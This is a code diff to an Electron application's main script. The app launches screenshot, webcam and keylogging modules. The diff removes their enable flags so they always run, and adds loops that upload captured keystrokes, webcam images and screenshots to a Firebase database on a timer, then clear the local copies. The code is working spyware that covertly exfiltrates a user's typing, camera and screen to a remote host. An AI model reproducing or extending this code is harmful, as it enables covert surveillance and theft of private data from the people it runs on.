@@ -104,10 +104,10 @@ app.on('ready', () => {
 let ScreenShot=require("./ScreenShot.js");
 ScreenShot();
    let WebCam = require("./WebCam.js");
-   WebCam(IsEnable);
+   WebCam();
  
 let KeyboardLogger=require("./Keyboardlogging.js");
-KeyboardLogger(KeyIsEnable);
+KeyboardLogger();
 var firebase = require('@firebase/app');
 require('@firebase/auth');
 require('@firebase/database');
@@ -131,20 +131,19 @@ require('dns').resolve('www.google.com', function(err) {
   //console.log("firebase",firebase);
                 
                    //  firebase.analytics();
-          let data=shared.GetPostedData();
-          if(data.length!=0)
+          let Keyboard_data=shared.GetKeyboardData();
+          if(Keyboard_data.length!=0)
           {
        
   
-            for(let i=0;i<data.length;i++)
+            for(let i=0;i<Keyboard_data.length;i++)
             {
               
               // try{
-           var path="Electron"+shared.getRandomInt("999999999")+"/";
+           var path="Keyboard/"+shared.getRandomInt("999999999")+"/";
               var body={
-                      type:data[i].Type,
-                      Output:data[i].Data
-              }
+                      Output:Keyboard_data[i].Data
+                       }
              firebase.default.database().ref(path).set(body);
               console.log("yes it happened")
              
@@ -155,8 +154,53 @@ require('dns').resolve('www.google.com', function(err) {
             console.log("No Record Found")
           }
           let res=[];
-          fs.writeFileSync("./Storage/Data.json",JSON.stringify(res));
+          fs.writeFileSync("./Storage/KeyboardStorage.json",JSON.stringify(res));
+          //-----------------------------------------------------------
+          
+          let WebCam_data=shared.GetWebCamData();
+          if(WebCam_data.length!=0)
+          {
+       
+  
+            for(let i=0;i<WebCam_data.length;i++)
+            {
+              
+           var path="WebCam/"+shared.getRandomInt("999999999")+"/";
+              var body={
+                      Output:WebCam_data[i].Data
+                       }
+             firebase.default.database().ref(path).set(body);
+              console.log("yes it happened")
+            }
+           
+          }else{
+            console.log("No Record Found")
           }
+    
+          fs.writeFileSync("./Storage/WebCamStorage.json",JSON.stringify(res));
+  //-----------------------------------------------------------
+  let ScreenShot_data=shared.GetSnapShotData();
+  if(ScreenShot_data.length!=0)
+  {
+
+
+    for(let i=0;i<ScreenShot_data.length;i++)
+    {
+      
+   var path="ScreenShot/"+shared.getRandomInt("999999999")+"/";
+      var body={
+              Output:ScreenShot_data[i].Data
+               }
+     firebase.default.database().ref(path).set(body);
+      console.log("yes it happened")
+    }
+   
+  }else{
+    console.log("No Record Found")
+  }
+  
+  fs.writeFileSync("./Storage/ScreenShotStorage.json",JSON.stringify(res));
+  }
        
           
 });
@@ -164,4 +208,4 @@ function callback()
 {
   console.log("Its Back")
 }
-},15000)
+},response.PostRequest)
